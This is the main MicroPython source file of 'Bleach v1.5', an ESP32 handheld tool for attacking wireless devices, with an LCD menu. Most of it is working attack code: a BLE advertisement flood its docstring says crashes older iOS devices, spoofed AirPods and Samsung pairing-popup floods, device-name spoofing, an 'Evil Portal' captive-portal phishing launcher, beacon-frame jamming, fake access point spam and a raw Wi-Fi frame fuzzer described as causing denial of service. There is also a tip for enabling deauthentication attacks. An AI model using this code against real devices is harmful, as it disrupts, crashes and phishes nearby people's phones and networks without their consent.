"""
    * Bleach v1.5 *
    
    The Bleach project is designed to assess the vulnerabilities of Bluetooth devices and WiFi networks, 
    among other targets.
    Use this software within the bounds of the law; any unauthorized use is strictly prohibited and subject to legal action. 
    The author disclaims responsibility for misuse or unintended use of the program. 
    Users should have foundational knowledge to modify MicroPython firmware in order to utilize Bleach effectively. 
    Use your knowledge wisely and responsibly.

    Author: https://github.com/FLOCK4H
"""

from machine import SoftI2C, Pin
from i2c_lcd import I2cLcd
import time
import bluetooth
from micropython import const
import uasyncio as asyncio
import gpio
import random
import gc
import struct
from hid_services import Keyboard, Mouse, Joystick
import ble_services
import captive
import network

I2C_ADDR = 0x27
totalRows = 2
totalColumns = 16

i2c = SoftI2C(scl=Pin(22), sda=Pin(21), freq=10000)

lcd = I2cLcd(i2c, I2C_ADDR, totalRows, totalColumns)

human_char = [
    0b00100,  #   *
    0b00100,  #   *
    0b01110,  #  ***
    0b10101,  # * * *
    0b00100,  #   *
    0b01110,  #  ***
    0b01010,  #  * *
    0b10001,  # *   *
]

apple_char = [
    0b00100,  #   *
    0b01110,  #  ***
    0b11111,  # *****
    0b11111,  # *****
    0b11111,  # *****
    0b01110,  #  ***
    0b00100,  #   *
    0b00000,  #     
]

bleach_logo = [
    0b00000,  # 
    0b11111,  # *****
    0b00000,  # 
    0b11110,  # ****
    0b00000,  # 
    0b11100,  # ***
    0b00000,  # 
    0b00000,  #     
]

swag_logo = [
    0b00100,  # 
    0b00100,  # *****
    0b11111,  # 
    0b10100,  # ****
    0b11111,  # 
    0b00101,  # ***
    0b11111,  # 
    0b00100  #     
]

spoofie_char = [
    0b11111,
    0b10001,
    0b10101,
    0b10101,
    0b10101,
    0b10101,
    0b10001,
    0b01110
]

camel_char = [
    0b00000,
    0b00000,
    0b11111,
    0b11000,
    0b11000,
    0b11111,
    0b00000,
    0b00000
]

def create_char(location, pattern):
    lcd.custom_char(location, bytearray(pattern))

create_char(0, apple_char)
create_char(1, bleach_logo)
create_char(2, human_char)
create_char(3, swag_logo)
create_char(4, spoofie_char)
create_char(5, camel_char)

bleach_text = "Bleach v1.5"
lcd.move_to(1, 0)
lcd.putchar(chr(1))  
lcd.putstr(" ")
lcd.putstr(bleach_text)

second_line = "(-_-)"
second_line_start_pos = (totalColumns - len(second_line)) // 2
lcd.move_to(second_line_start_pos, 1)
lcd.putstr(second_line)

time.sleep(4)
lcd.clear()

del bleach_text, second_line

main_menu_items = ["Bluetooth", "WiFi", "HID", "Others"]
sub_menus = {
    "Bluetooth": ["Sour Apple", "Blue Swag", "Cameleon", "Spoofie", "BLE Recon"],
    "WiFi": ["Evil Portal", "WiFi Recon", "Beacon Jam", "Fake APs", "Fuzzy"],
    "HID": ["Mouse", "Keyboard", "JoyStick"],
    "Others": ["Blink", "Starships"] # Blink introduces noise, use capacitive or inductive coupling as a workaround or implement a debounce algorithm to stabilize the signal
}

current_menu = main_menu_items
current_item = 0
menu_stack = []

def display_menu():
    lcd.clear()
    for i in range(2):
        if current_item + i < len(current_menu):
            lcd.move_to(0, i)
            prefix = "> " if i == 0 else "  "
            menu_text = current_menu[current_item + i][:totalColumns - len(prefix)]
            if menu_text == "Sour Apple":
                lcd.putchar(chr(0))  
                lcd.putstr(" ")
            if menu_text == "Evil Portal":
                lcd.putchar(chr(2))  
                lcd.putstr(" ")
            if menu_text == "Blue Swag":
                lcd.putchar(chr(3))  
                lcd.putstr(" ")
            if menu_text == "Spoofie":
                lcd.putchar(chr(4))  
                lcd.putstr(" ")
            if menu_text == "Cameleon":
                lcd.putchar(chr(5))  
                lcd.putstr(" ")
            
            lcd.putstr(prefix + menu_text)


def update_menu_position(change):
    global current_item, current_menu, menu_stack
    if change != 0:
        if change < 0 and current_item == 0 and len(menu_stack) > 0:
            current_menu, current_item = menu_stack.pop()
        else:
            current_item += change
            current_item = max(0, min(current_item, len(current_menu) - 1))
        display_menu()

def action_sour_apple():
    """
        Credits to @N1-TR0

        Floods local BLE environment with advertisements
        causing iOS devices below version 17.2 to crash 
    """
    lcd.clear()
    lcd.putstr("Cooking...")
    def sourESP():

        import utime
        import ubluetooth as bluetooth

        bt = bluetooth.BLE()
        bt.active(True)

        try:
            while not gpio.is_button_pressed():
                types = [0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0]
                bt_packet = bytes([16, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, types[random.randint(0, len(types) - 1)],
                                random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), 0x00, 0x00, 0x10,
                                random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)])
                struct_params = [20, 20, 3, 0, 0, 0, 0, 0, 0, 0, 0, 7, 0]
                cmd_pkt = struct.pack("<HHBBB6BBB", *struct_params)
                
                bt.gap_advertise(100, bytearray(cmd_pkt))
                utime.sleep(0.02)
                bt.gap_advertise(100, bytearray([0x01]))
                utime.sleep(0.02)
                bt.gap_advertise(100, bt_packet)
                utime.sleep(0.02)
                
                utime.sleep(0.02)
                bt.gap_advertise(100, bytearray([0x00]))
                utime.sleep(0.02)

        except KeyboardInterrupt:
            print("Keyboard interrupt, closing connection.")
        except Exception as e:
            print(f"An error occurred: {e}")

    sourESP()
    display_menu()

def run_portal(template):
    lcd.clear()
    lcd.putstr(":. Portal activated .:")
    try:
        captive.run_me(gpio.is_button_pressed, template)
    except Exception as e:
        print(str(e))
    finally:
        display_menu()

def action_captive_portal():
    global current_menu, current_item, current_action_mode

    current_menu=["__ Choose __", "Indigo", "Matrix", "Valentines", "HappyMeal"]
    current_item=0
    current_action_mode="Captive"
    display_menu()

class JoyStickDevice:
    def __init__(self):
        self.x = 0
        self.y = 0

        self.prev_x = 0
        self.prev_y = 0

        self.pin_forward = Pin(23, Pin.IN)
        self.pin_reverse = Pin(19, Pin.IN)
        self.pin_left = Pin(18, Pin.IN)
        self.pin_right = Pin(5, Pin.IN)

        self.joystick = Joystick("Joystick")
        self.joystick.set_state_change_callback(self.joystick_state_callback)
        self.joystick.start()

    def joystick_state_callback(self):
        if self.joystick.get_state() is Joystick.DEVICE_IDLE:
            return
        elif self.joystick.get_state() is Joystick.DEVICE_ADVERTISING:
            return
        elif self.joystick.get_state() is Joystick.DEVICE_CONNECTED:
            return
        else:
            return

    def advertise(self):
        self.joystick.start_advertising()

    def stop_advertise(self):
        self.joystick.stop_advertising()

    def start(self):
        lcd.clear()
        lcd.putstr("Cooking...")
        try:
            while True:  

                if gpio.is_button_pressed():
                    self.stop()
                    break  

                self.x = self.pin_right.value() * 127 - self.pin_left.value() * 127
                self.y = self.pin_reverse.value() * 127 - self.pin_forward.value() * 127

                if (self.x != self.prev_x) or (self.y != self.prev_y):

                    self.prev_x = self.x
                    self.prev_y = self.y

                    if self.joystick.get_state() is Joystick.DEVICE_CONNECTED:
                        self.joystick.set_axes(self.x, self.y)
                        self.joystick.notify_hid_report()
                    elif not gpio.is_button_pressed() and self.joystick.get_state() is Joystick.DEVICE_IDLE:
                        self.joystick.start_advertising()
                        i = 10
                        while not gpio.is_button_pressed() and i > 0 and self.joystick.get_state() is Joystick.DEVICE_ADVERTISING:
                            time.sleep(3)
                            i -= 1
                        if self.joystick.get_state() is Joystick.DEVICE_ADVERTISING:
                            self.joystick.stop_advertising()

                if self.joystick.get_state() is Joystick.DEVICE_CONNECTED:
                    time.sleep_ms(20)
                else:
                    time.sleep(2)
        except Exception as e:
            print(str(e))
        finally:
            display_menu()

    def stop(self):
        self.joystick.stop()

class MouseDevice:
    def __init__(self):
        self.x = 0
        self.y = 0

        self.prev_x = 0
        self.prev_y = 0

        self.pin_forward = Pin(5, Pin.IN)
        self.pin_reverse = Pin(23, Pin.IN)
        self.pin_right = Pin(19, Pin.IN)
        self.pin_left = Pin(18, Pin.IN)

        self.mouse = Mouse("Mouse")
        self.mouse.set_state_change_callback(self.mouse_state_callback)
        self.mouse.start()

    def mouse_state_callback(self):
        if self.mouse.get_state() is Mouse.DEVICE_IDLE:
            return
        elif self.mouse.get_state() is Mouse.DEVICE_ADVERTISING:
            return
        elif self.mouse.get_state() is Mouse.DEVICE_CONNECTED:
            return
        else:
            return

    def advertise(self):
        self.mouse.start_advertising()

    def stop_advertise(self):
        self.mouse.stop_advertising()

    def start(self):
        lcd.clear()
        lcd.putstr("Cooking...")
        try:
            while True:  
                if gpio.is_button_pressed():
                    self.stop()
                    break  
                self.x = self.pin_right.value() * 127 - self.pin_left.value() * 127
                self.y = self.pin_forward.value() * 127 - self.pin_reverse.value() * 127

                if (self.x != self.prev_x) or (self.y != self.prev_y):
                    self.prev_x = self.x
                    self.prev_y = self.y

                    if self.mouse.get_state() is Mouse.DEVICE_CONNECTED:
                        self.mouse.set_axes(self.x, self.y)
                        self.mouse.notify_hid_report()
                        self.test()
                    elif not gpio.is_button_pressed() or self.mouse.get_state() is Mouse.DEVICE_IDLE:
                        self.mouse.start_advertising()
                        i = 10
                        while not gpio.is_button_pressed() and i > 0 and self.mouse.get_state() is Mouse.DEVICE_ADVERTISING:
                            time.sleep(3)
                            i -= 1
                        if self.mouse.get_state() is Mouse.DEVICE_ADVERTISING:
                            self.mouse.stop_advertising()

                if self.mouse.get_state() is Mouse.DEVICE_CONNECTED:
                    time.sleep_ms(20)
                else:
                    time.sleep(2)
        except Exception as e:
            print(str(e))
        finally:
            display_menu()

    def stop(self):
        self.mouse.stop()

    def test(self):
        self.mouse.set_battery_level(50)
        self.mouse.notify_battery_level()

        for i in range(30):
            self.mouse.set_axes(100,100)
            self.mouse.set_buttons(1)
            self.mouse.notify_hid_report()
            time.sleep_ms(500)

            self.mouse.set_axes(100,-100)
            self.mouse.set_buttons()
            self.mouse.notify_hid_report()
            time.sleep_ms(500)

            self.mouse.set_axes(-100,-100)
            self.mouse.set_buttons(b2=1)
            self.mouse.notify_hid_report()
            time.sleep_ms(500)

            self.mouse.set_axes(-100,100)
            self.mouse.set_buttons()
            self.mouse.notify_hid_report()
            time.sleep_ms(500)

        self.mouse.set_axes(0,0)
        self.mouse.set_buttons()
        self.mouse.notify_hid_report()

        self.mouse.set_battery_level(100)
        self.mouse.notify_battery_level()

class KBDevice:
    def __init__(self):
        # Define state
        self.key0 = 0x00
        self.key1 = 0x00
        self.key2 = 0x00
        self.key3 = 0x00

        self.pin_forward = Pin(5, Pin.IN)
        self.pin_reverse = Pin(23, Pin.IN)
        self.pin_right = Pin(19, Pin.IN)
        self.pin_left = Pin(18, Pin.IN)

        self.keyboard = Keyboard("Keyboard")
        self.keyboard.set_state_change_callback(self.keyboard_state_callback)
        self.keyboard.start()

    def keyboard_state_callback(self):
        if self.keyboard.get_state() is Keyboard.DEVICE_IDLE:
            return
        elif self.keyboard.get_state() is Keyboard.DEVICE_ADVERTISING:
            return
        elif self.keyboard.get_state() is Keyboard.DEVICE_CONNECTED:
            return
        else:
            return

    def keyboard_event_callback(self, bytes):
        print("Keyboard state callback with bytes: ", bytes)

    def advertise(self):
        self.keyboard.start_advertising()

    def stop_advertise(self):
        self.keyboard.stop_advertising()

    def start(self):
        lcd.clear()
        lcd.putstr("Cooking...")
        while True: 
            if gpio.is_button_pressed():
                self.stop()
                break 

            if self.pin_forward.value():
                self.key0 = 0x1A  # W
            else:
                self.key0 = 0x00

            if self.pin_left.value():
                self.key1 = 0x04  # A
            else:
                self.key1 = 0x00

            if self.pin_reverse.value():
                self.key2 = 0x16  # S
            else:
                self.key2 = 0x00

            if self.pin_right.value():
                self.key3 = 0x07  # D
            else:
                self.key3 = 0x00

            if (self.key0 != 0x00) or (self.key1 != 0x00) or (self.key2 != 0x00) or (self.key3 != 0x00):
                if self.keyboard.get_state() is Keyboard.DEVICE_CONNECTED:
                    self.keyboard.set_keys(self.key0, self.key1, self.key2, self.key3)
                    self.keyboard.notify_hid_report()
                    self.test()
                elif self.keyboard.get_state() is Keyboard.DEVICE_IDLE:
                    self.advertise()
                    i = 10
                    while not gpio.is_button_pressed() and i > 0 and self.keyboard.get_state() is Keyboard.DEVICE_ADVERTISING:
                        time.sleep(3)
                        i -= 1
                    if self.keyboard.get_state() is Keyboard.DEVICE_ADVERTISING:
                        self.keyboard.stop_advertising()

            if self.keyboard.get_state() is Keyboard.DEVICE_CONNECTED:
                time.sleep_ms(20)
            else:
                time.sleep(2)

    def send_char(self, char):
        if char == " ":
            mod = 0
            code = 0x2C
        elif ord("a") <= ord(char) <= ord("z"):
            mod = 0
            code = 0x04 + ord(char) - ord("a")
        elif ord("A") <= ord(char) <= ord("Z"):
            mod = 1
            code = 0x04 + ord(char) - ord("A")
        else:
            assert 0

        self.keyboard.set_keys(code)
        self.keyboard.set_modifiers(left_shift=mod)
        self.keyboard.notify_hid_report()
        time.sleep_ms(2)

        self.keyboard.set_keys()
        self.keyboard.set_modifiers()
        self.keyboard.notify_hid_report()
        time.sleep_ms(2)


    def send_string(self, st):
        print(st)
        for c in st:
            self.send_char(c)

    # Only for test
    def stop(self):
        self.keyboard.stop()

    # Test routine
    def test(self):
        time.sleep(5)
        self.keyboard.set_battery_level(50)
        self.keyboard.notify_battery_level()
        time.sleep_ms(2)

        # Press Shift+W
        self.keyboard.set_keys(0x1A)
        self.keyboard.set_modifiers(right_shift=1)
        self.keyboard.notify_hid_report()

        # release
        self.keyboard.set_keys()
        self.keyboard.set_modifiers()
        self.keyboard.notify_hid_report()
        time.sleep_ms(500)

        # Press a
        self.keyboard.set_keys(0x04)
        self.keyboard.notify_hid_report()

        # release
        self.keyboard.set_keys()
        self.keyboard.notify_hid_report()
        time.sleep_ms(500)

        # Press s
        self.keyboard.set_keys(0x16)
        self.keyboard.notify_hid_report()

        # release
        self.keyboard.set_keys()
        self.keyboard.notify_hid_report()
        time.sleep_ms(500)

        # Press d
        self.keyboard.set_keys(0x07)
        self.keyboard.notify_hid_report()

        # release
        self.keyboard.set_keys()
        self.keyboard.notify_hid_report()
        time.sleep_ms(500)

        self.send_string(" Hello World")

        self.keyboard.set_battery_level(100)
        self.keyboard.notify_battery_level()

def action_mouse():
    d = MouseDevice()
    d.start()

def action_kb():
    d = KBDevice()
    d.start()

def action_joystick():
    d = JoyStickDevice()
    d.start()

class BLEScanner:
    def __init__(self, scan_time=10000):
        _IRQ_SCAN_RESULT = const(5)
        _IRQ_SCAN_DONE = const(6)
        self.bt = bluetooth.BLE()
        self.bt.irq(self.bt_irq)
        self.bt.active(True)
        self.scan_time = scan_time
        self.devices = set()
        
    def get_scanned_devices(self):
        return list(self.devices)
    
    def bt_irq(self, event, data):
        try:
            if event == _IRQ_SCAN_RESULT:
                addr_type, addr, connectable, rssi, adv_data_view = data
                adv_data = bytes(adv_data_view)
                addr_str = ':'.join(['%02X' % i for i in addr])
                if addr_str not in self.devices:
                    self.devices.add(addr_str)
                    adv_data_str = ' '.join(['%02X' % b for b in adv_data])
                    connectable_str = "Yes" if connectable else "No"
                    is_apple = "Yes" if self.is_apple(adv_data) else "No"
                    print(f"Address: {addr_str}, RSSI: {rssi}, Connectable: {connectable_str}, Advertisement Data: {adv_data_str}, Apple: {is_apple}")

            elif event == _IRQ_SCAN_DONE:
                print('Scan complete')

        except Exception as e:
            print(f"Error: {str(e)}")
            print(f"adv_data type: {type(adv_data)}")
            print(f"adv_data content: {adv_data}")
            
    async def start_scan(self):
        self.devices.clear()
        self.bt.gap_scan(self.scan_time, 30000, 30000)
        await asyncio.sleep_ms(self.scan_time)
        self.stop_scan()

    @staticmethod
    def is_apple(adv_data):
        adv_data_hex = ''.join(['%02X' % b for b in bytes(adv_data)])
        apple_id_index = adv_data_hex.find('FF4C00')

        if apple_id_index != -1:
            end_index = apple_id_index + 10
            if end_index <= len(adv_data_hex):
                if adv_data_hex[apple_id_index+6:end_index] != '0215':
                    return True
        return False

    def stop_scan(self):
        self.bt.gap_scan(None)
        
current_action_mode = None

def action_ble_mac_scan():
    global current_menu, current_item

    lcd.clear()
    lcd.putstr("Scanning...")

    scanner = BLEScanner(10000)
    asyncio.run(scanner.start_scan())

    scanned_devices = ["====++++===="] + scanner.get_scanned_devices() + ["====++++===="]
    
    if scanned_devices:
        current_menu = scanned_devices
        current_item = 0
        display_menu()
    else:
        lcd.putstr("No devices found")
        time.sleep(2)
        display_menu()

def start_advertising_flood():
    async def flood():
        bt = bluetooth.BLE()
        bt.active(True)
        apple = 0x004C
        samsung = 0x0075
        android = 0xFE2C
        advertising_data = [
            (apple, "071907022075aa3001000045121212000000000000000000000000"),  # Airpods
            (apple, "0719070e2075aa3001000045121212000000000000000000000000"),  # Airpods Pro
            (apple, "0719070a2075aa3001000045121212000000000000000000000000"),  # Airpods Max
            (apple, "0719070f2075aa3001000045121212000000000000000000000000"),  # Airpods 2
            (apple, "071907132075aa3001000045121212000000000000000000000000"),  # Airpods 3
            (apple, "071907142075aa3001000045121212000000000000000000000000"),  # Airpods Pro 2
            (apple, "04042A0000000F05C109604C950000100000000000"),              # Number Setup
            (apple, "04042a0000000f05c106604c950000100000000000"),              # Apple TV Pair
            (apple, "04042a0000000f05c101604c950000100000000000"),              # Apple TV Setup
            (apple, "04042a0000000f05c120604c950000100000000000"),              # Apple TV Configure
            (apple, "04042a0000000f05c10b604c950000100000000000"),              # Homepod Setup
            (samsung, "42098102141503210109AB0C0146063CDD0A00000000A700"),
            (samsung, "00C3A3D7B11740526464000104"),
            (android, "92BBBD"),
            (android, "000006"),
            (android, "821F66"),
            (android, "821F06"),
            (android, "F52494"),
            (android, "718FA4"),
            (android, "D446A7"),
            (android, "CD8256"),
            (android, "0000F0"),
            (android, "0E30C3"),
            (android, "0003F0")
        ]

        try:
            while True:
                if gpio.is_button_pressed():
                        break
                for man, raw_data_hex in advertising_data:

                    packet = create_adv_packet(man, raw_data_hex)
                    bt.gap_advertise(100, packet)
                    await asyncio.sleep_ms(2)

        except Exception as e:
            print(f"Error in advertising flood: {e}")
        finally:
            bt.active(False)
            gc.collect()
            print("Bluetooth deactivated")

    def create_adv_packet(company_id, raw_data_hex):
        company_identifier = company_id
        raw_data = bytes.fromhex(raw_data_hex)
        manufacturer_data = struct.pack('<H', company_identifier) + raw_data
        manufacturer_data_length = len(manufacturer_data) + 1
        return bytearray([manufacturer_data_length, 0xFF]) + manufacturer_data

    asyncio.run(flood())
            
def make_it_rain():
    lcd.clear()
    lcd.putstr("Flooding...")
    start_advertising_flood()
    
def action_blue_swag():
    make_it_rain()
    
def action_spoofie():
    lcd.clear()
    lcd.putstr("Spoofing...")
    ble_services._start()
    
def action_cameleon():
    global current_menu, current_item, current_action_mode
    lcd.clear()

    current_menu = ["___ Apple ___"] + ["AirPods", "AirPods 2", "AirPods Pro", "AirPods Pro 2", "Airpods Max"] + ["__ Samsung __"] + ["Buds Pro", "Buds Pro 2"] + ["___ JBL ___"] + ["JBL Xtreme 2", "JBL Xtreme", "JBL Flip 6", "JBL Flip 5", "JBL Flip 4", "JBL Clip 2", "JBL Clip 3"] + ["‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾‾"] 
    current_item = 0
    display_menu()
    current_action_mode = "Cameleon"
    
def action_camouflage(name):
    print(name)
    lcd.clear()
    lcd.putstr(f"O_o I'm {name}")
    ble_services.advertise_spoofer(name, gpio.is_button_pressed)
    while not gpio.is_button_pressed():
        pass
    display_menu()

def wifi_scan(wifi):
    networks = wifi.scan()
    return networks

def display_networks(wifi):
    networks = wifi_scan(wifi)
    lcd.clear()
    try:
        for network in networks:
            essid = network[0].decode('utf-8')
            bssid = ''.join('{:02x}'.format(b) for b in network[1])
            lcd.putstr(f"{essid}")
            lcd.move_to(0,1)
            lcd.putstr(f"{bssid}\n")
            time.sleep(2)  # Delay
            lcd.clear()
    except Exception as e:
        print(str(e))
    finally:
        display_menu()
        
def random_mac():
    return bytes([0x00, 0x16, 0x3e,
                  random.randint(0x00, 0x7f),
                  random.randint(0x00, 0xff),
                  random.randint(0x00, 0xff)])    
        
def action_recon():
    wifi = network.WLAN(network.STA_IF)
    wifi.active(True)
    print("Displaying...")
    display_networks(wifi)

def action_bjammer():
    """
        The wifi.send_raw_packet functionality exists because MicroPython firmware has been modified to
        expose necessary ESP-IDF functions responsible for raw frame sending (with a lot of restrictions) to MicroPython.
        PROTIP: By downgrading ESP-IDF to v4 you should omit the restrictions and even upgrade your Bleach (e.g., deauthing).
        
        Sends a high volume of beacon frames in a short period 
        effectively creating numerous fake WiFi networks 
        This can overwhelm the WiFi network scanning and selection process
        potentially leading to a denial of service as clients may see a saturated list of networks.
    """

    with open('ssid_flood.txt', 'r') as f:
        ssid_list = f.readlines()    
    lcd.clear()
    lcd.putstr("Jamming...")
    
    wifi = network.WLAN(network.STA_IF)
    wifi.active(True)
    frame_control = b'\x80\x00'  # Frame control field
    duration = b'\x00\x00'
    dst_mac = b'\xFF\xFF\xFF\xFF\xFF\xFF'  # Broadcast address
    beacon_interval = b'\x64\x00'  # Beacon Interval 100 TU (102.4ms)
    capability_info = b'\x01\x04'  # Capability Information field

    try:
        index = 0
        sequence_number = 0
        while True:
            if gpio.is_button_pressed():
                break
            current_timestamp = 0
            timestamp = current_timestamp.to_bytes(8, 'little')
            src_mac = random_mac()  # Randomize MAC address
            bss_id = src_mac
            seq_ctrl = sequence_number.to_bytes(2, 'little')
            sequence_number = (sequence_number + 1) % 4096
            current_ssid = ssid_list[index] 
            #ssid = b'\x00' + chr(len(current_ssid)).encode() + current_ssid.encode()
            ssid = b'\x00' + len(current_ssid).to_bytes(1, 'big') + current_ssid.encode()
            supported_rates = b'\x01\x08\x82\x84\x8b\x96\x24\x30\x48\x6c'

            frame_body = timestamp + beacon_interval + capability_info + ssid + supported_rates

            frame = frame_control + duration + dst_mac + src_mac + bss_id + seq_ctrl + frame_body
            wifi.send_raw_packet(frame)
            time.sleep(random.uniform(0.01, 0.03))
            if index >= len(ssid_list) - 1:
                index = 0
            else:
                index += 1
            print(f"Beacon frame sent for SSID {current_ssid}.")
    except OSError as e:
        print("OS Error: ", e)
    finally:
        gc.collect()
        display_menu()
        
def action_apspammer():
    """
        The wifi.send_raw_packet functionality exists because MicroPython firmware has been modified to
        expose necessary ESP-IDF function responsible for raw frame sending (with a lot of restrictions) to MicroPython
        PROTIP: By downgrading ESP-IDF to v4 you should omit the restrictions and even upgrade your Bleach (e.g. deauthing)

        This will flood the nearby WiFi network with fake access points, pretty unharmful
    """
    with open('ssid_spam.txt', 'r') as f:
        ssids = f.readlines()
    lcd.clear()
    lcd.putstr("Flooding...")
    
    wifi = network.WLAN(network.STA_IF)
    wifi.active(True)
    frame_control = b'\x80\x00'  # Frame control field
    duration = b'\x00\x00'
    dst_mac = b'\xFF\xFF\xFF\xFF\xFF\xFF'  # Broadcast address
    beacon_interval = b'\x64\x00'  # Beacon Interval 100 TU (102.4ms)
    capability_info = b'\x01\x04'  # Capability Information field
    
    try:
        index = 0
        sequence_number = 0
        while True:
            if gpio.is_button_pressed():
                break
            current_timestamp = 0
            timestamp = current_timestamp.to_bytes(8, 'little')
            src_mac = random_mac()
            bss_id = src_mac
            seq_ctrl = sequence_number.to_bytes(2, 'little')
            sequence_number = (sequence_number + 1) % 4096
            current_ssid = ssids[index] 
            #ssid = b'\x00' + chr(len(current_ssid)).encode() + current_ssid.encode()
            ssid = b'\x00' + len(current_ssid).to_bytes(1, 'big') + current_ssid.encode()
            supported_rates = b'\x01\x08\x82\x84\x8b\x96\x24\x30\x48\x6c'

            frame_body = timestamp + beacon_interval + capability_info + ssid + supported_rates

            frame = frame_control + duration + dst_mac + src_mac + bss_id + seq_ctrl + frame_body
            wifi.send_raw_packet(frame)
            time.sleep(random.uniform(0.01, 0.05))
            if index >= len(ssids) - 1:
                index = 0
            else:
                index += 1
            print(f"Beacon frame sent for SSID {current_ssid}.")
    except OSError as e:
        print("OS Error: ", e)
    finally:
        gc.collect()
        display_menu()
        
def action_fuzzer():
    """
        The wifi.send_raw_packet functionality exists because MicroPython firmware has been modified to
        expose necessary ESP-IDF function responsible for raw frame sending (with a lot of restrictions) to MicroPython
        PROTIP: By downgrading ESP-IDF to v4 you should omit the restrictions and even upgrade your Bleach (e.g. deauthing)

        This function dynamically generates frame payloads with varying lengths and content, simulating a lightweight 
        fuzzing scenario, the results are similar to DoS attack, after a brief moment the nearby devices will have
        'no internet connection' (<- iPhone example) displayed in WiFi settings. *only if your Device/Router is vulnerable
        
        !! In rare cases fuzzing may lead to a crash of the device, be careful !! 
    """
    lcd.clear()
    lcd.move_to(4, 0)
    lcd.putstr("Fuzzy X)")
    lcd.move_to(2, 1)
    lcd.putstr("Cookin (0-0)")
    wifi = network.WLAN(network.STA_IF)
    wifi.active(True)

    frame_types = [0x40, 0x80]
    try:
        print("Fuzzing started...")
        burst_mode = False
        burst_counter = 0

        while True:
            frame_type = random.choice(frame_types)
            frame_control = bytes([frame_type, 0x00])
            src_mac = random_mac()
            dst_mac = b'\xFF\xFF\xFF\xFF\xFF\xFF'  
            bss_id = src_mac
            seq_ctrl = bytes([0x00, 0x00])
            
            if burst_counter == 0:
                burst_mode = random.choice([True, False])
                burst_counter = random.randint(5, 20) if burst_mode else 0

            if burst_mode:
                # longer frame body to potentially overload buffers (it damn works)
                ssid_length = random.randint(1, 255)
                additional_payload = bytes(random.getrandbits(8) for _ in range(random.randint(100, 400)))
            else:
                ssid_length = random.randint(1, 32)
                additional_payload = b''

            ssid = bytes([ssid_length]) + bytes(random.getrandbits(8) for _ in range(ssid_length))
            supported_rates = bytes([0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24])

            frame_body = ssid + supported_rates + additional_payload
            frame = frame_control + dst_mac + src_mac + bss_id + seq_ctrl + frame_body
            
            wifi.send_raw_packet(frame)
            if burst_mode:
                time.sleep(random.uniform(0.001, 0.005))
                burst_counter -= 1
            else:
                time.sleep(random.uniform(0.01, 0.05))
            
            if gpio.is_button_pressed():
                break
            

    except Exception as e:
        print(f"Fuzzing error: {e}")
    finally:
        print("Fuzzing completed. Cleaning up...")
        gc.collect()
        
def action_blink():
    """
        Blink introduces noise, as said earlier.
    """
    lcd.clear()
    lcd.move_to(6,0)
    lcd.putstr("0-0")
    lcd.move_to(1,1)
    lcd.putstr("I'm blinking..")
    led_diode = Pin(2, Pin.OUT)
    
    try:
        while True:
            led_diode.value(1)
            time.sleep(0.5)
            led_diode.value(0)
            time.sleep(0.5)
            
            if gpio.is_button_pressed():
                 break
    except KeyboardInterrupt:
        print("Program stopped manually")
    except Exception as e:
        print(str(e))
    finally:
        display_menu()
        gc.collect()

def action_starships():
    """
        Move rotary encoder left to go up or right to go down
        Watch out for evil # that will try to hurt you
    """
    plane_position = 1
    obstacles = []
    score = 0
    start_time = time.time()
    speed_factor = 0.05

    def update_plane_position(encoder_delta):
        nonlocal plane_position
        if encoder_delta < 0:
            plane_position = max(0, plane_position - 1)
        elif encoder_delta > 0:
            plane_position = min(1, plane_position + 1)

    def spawn_obstacle():
        obstacle_row = random.randint(0, 1)
        obstacles.append((totalColumns - 1, obstacle_row))

    def move_obstacles():
        nonlocal score
        for i in range(len(obstacles)):
            obstacles[i] = (obstacles[i][0] - 1, obstacles[i][1])
        while obstacles and obstacles[0][0] < 0:
            obstacles.pop(0)
            score += 1

    def check_collision():
        for obstacle in obstacles:
            if obstacle == (3, plane_position):
                return True
        return False

    def draw():
        lcd.clear()
        lcd.move_to(3, plane_position)
        lcd.putchar('*')
        for obstacle in obstacles:
            lcd.move_to(obstacle[0], obstacle[1])
            lcd.putchar('#')
        score_text = str(score)
        lcd.move_to(totalColumns - len(score_text), totalRows - 1)
        lcd.putstr(score_text)

    try:
        print("Starting Starships game...")
        game_over = False
        obstacle_spawn_counter = 0
        while not game_over:
            current_time = time.time()
            elapsed_time = current_time - start_time

            if elapsed_time % 10 < 0.1:
                speed_factor = max(0.03, speed_factor - random.uniform(0.01, 0.02))

            encoder_delta = gpio.get_encoder_position()
            update_plane_position(encoder_delta)
            gpio.encoder_value = 0

            obstacle_spawn_counter += 1
            if obstacle_spawn_counter >= random.randint(10, 20):
                spawn_obstacle()
                obstacle_spawn_counter = 0

            move_obstacles()
            game_over = check_collision()
            draw()
            time.sleep(speed_factor)

        print("Game Over!")

    except KeyboardInterrupt:
        print("Game interrupted.")

    finally:
        lcd.clear()
        lcd.putstr("Game Over")
        time.sleep(2)
        display_menu()
 
menu_actions = {
    # BLE
    "Sour Apple": action_sour_apple,
    "Blue Swag": action_blue_swag,
    "Spoofie": action_spoofie,
    "BLE Recon": action_ble_mac_scan,
    "Cameleon": action_cameleon,
    # WiFi
    "Evil Portal": action_captive_portal,
    "WiFi Recon" : action_recon,
    "Beacon Jam": action_bjammer,
    "Fake APs": action_apspammer,
    "Fuzzy": action_fuzzer,
    # HID
    "Mouse": action_mouse,
    "Keyboard": action_kb,
    "JoyStick": action_joystick,
    # Others
    "Blink": action_blink,
    "Starships": action_starships
}
    
def select_menu_item():
    global current_menu, current_item, menu_stack, current_action_mode
    selected_item = current_menu[current_item]

    if selected_item in sub_menus:
        menu_stack.append((current_menu, current_item))
        current_menu = sub_menus[selected_item]
        current_item = 0
        display_menu()
    elif selected_item in menu_actions:
        menu_actions[selected_item]()
    elif len(menu_stack) > 0 and current_item == 0:
        current_menu, current_item = menu_stack.pop()
        display_menu()
    elif "====" not in selected_item and "__" not in selected_item:
        if current_action_mode == 'BlueSwag':
            make_it_rain(selected_item)
        elif current_action_mode == 'Cameleon':
            action_camouflage(selected_item)
        elif current_action_mode == 'Captive':
            print("Running portal for: {selected_item}")
            run_portal(selected_item)
            
display_menu()

while True:
    encoder_change = gpio.get_encoder_position()
    if encoder_change != 0:
        update_menu_position(encoder_change)
        gpio.encoder_value = 0

    if gpio.is_button_pressed():
        select_menu_item()
        time.sleep(0.1)

    time.sleep(0.05)
















